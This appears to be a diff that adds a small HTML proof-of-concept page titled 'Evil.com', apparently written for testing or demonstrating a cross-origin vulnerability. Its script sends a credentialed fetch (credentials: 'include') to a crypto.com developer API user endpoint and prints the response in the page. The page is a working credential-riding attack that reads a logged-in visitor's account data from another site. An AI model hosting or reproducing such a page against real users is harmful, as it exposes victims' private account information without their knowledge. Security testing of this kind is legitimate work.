@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Evil.com</title>
+</head>
+
+<body>
+    <div>Hello! How are you?</div>
+    <script>
+        fetch("https://developer.crypto.com/api/user", {
+            credentials: "include"
+        })
+            .then(r => r.text())
+            .then(data => {
+                document.body.innerText = data;
+            });
+    </script>
+</body>
+
+</html>
